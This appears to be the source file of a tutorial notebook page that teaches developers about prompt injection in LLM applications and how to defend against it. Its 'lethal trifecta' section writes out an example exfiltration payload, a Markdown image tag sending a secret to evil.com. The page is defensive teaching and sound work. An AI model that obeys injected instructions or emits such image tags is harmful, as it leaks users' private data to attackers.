"use client";

import { NotebookPage } from "@/components/notebook/notebook-page";
import { Cell } from "@/lib/cells";

const cells: Cell[] = [
  {
    id: "intro",
    type: "text",
    content: `In traditional software, there's a hard line between code and data. SQL has parameterized queries. Memory has typed boundaries. You can't accidentally execute user input as code (unless you really try). LLMs don't have that. Everything — your instructions, the user's message, retrieved documents — is just a stream of tokens. The model uses pattern matching to "guess" which tokens are instructions and which are data. There is no enforced boundary.

This means a well-crafted user message can override your system prompt. Not because the model is broken — because that's how attention works.`,
  },
  {
    id: "injection-vs-jailbreaking",
    type: "text",
    content: `## Injection vs. jailbreaking

People mix these up constantly. They're different problems with different owners.

**Prompt injection** targets your application. The attacker wants to leak your system prompt, trigger tool calls, or exfiltrate user data. This is your problem to defend against.

**Jailbreaking** targets the model's safety training. The attacker wants to generate globally restricted content (hate speech, weapons instructions, etc.). This is mostly the model provider's problem — though you still want output filtering as a safety net.

| | Prompt Injection | Jailbreaking |
|---|---|---|
| **Target** | Your app's logic | The model's safety training |
| **Goal** | Leak data, invoke tools, override instructions | Generate restricted content |
| **Your job?** | Yes, entirely | Mostly the provider's |`,
  },
  {
    id: "injection-demo",
    type: "interactive",
    component: "InjectionDemo",
  },
  {
    id: "lethal-trifecta",
    type: "text",
    content: `## The "lethal trifecta"

The most common real-world attack against LLM apps chains three things:

1. **Prompt injection** — attacker sneaks instructions into the model's context
2. **Data access** — the model can see private data (user info, API keys, internal docs)
3. **Unsanitized output** — the frontend renders the model's response without filtering

Here's the concrete attack: the model gets tricked into outputting a Markdown image tag like \`![info](https://evil.com/?data=SECRET)\`. If your frontend renders Markdown (most do), the browser tries to "load" that image — sending a GET request to \`evil.com\` with the stolen data in the URL. The attacker checks their server logs. Done.

This works because Markdown image tags are invisible to the user — they just see a broken image icon, if anything. The data leaves through a side channel that looks like normal web traffic.

The fix is straightforward: **strip image tags from AI output** and set a CSP header (\`img-src 'self'\`) so the browser blocks external image requests even if one slips through.`,
  },
  {
    id: "defense",
    type: "text",
    content: `## Defense in depth

No single defense stops everything. You layer them so each one catches what the previous one misses.

### 1. Input — before the model sees it
Validate input length at the HTTP layer (not just the model layer). Rate-limit per user — attackers need many turns to succeed. A lightweight classifier can flag obvious injection attempts before the main model processes them.

### 2. Context — inside the prompt
Use structured message roles (\`system\`/\`user\`/\`assistant\`) instead of string concatenation. If you're doing RAG, explicitly tag retrieved content as untrusted data. Don't put secrets in your system prompt — assume it will leak.

### 3. Execution — what the model can do
Every tool call should use the authenticated user's permissions, not a service account. Mutating actions need human confirmation. Cap the number of tool-calling steps so the model can't loop forever.

### 4. Output — before the user sees it
Strip Markdown image tags, \`<script>\` tags, and iframes from AI output. Set a Content Security Policy header. If you don't need external images in AI responses, block them entirely.

The key insight: **your system prompt is a guardrail, not a security boundary.** Design your app so that even if the system prompt leaks completely, no real damage is done. The actual security comes from server-side validation, identity-bound tool permissions, and output sanitization.`,
  },
];

export default function SecurityPage() {
  return (
    <NotebookPage
      title="Security"
      description="LLMs can't tell instructions from data. That's the whole problem."
      cells={cells}
    />
  );
}
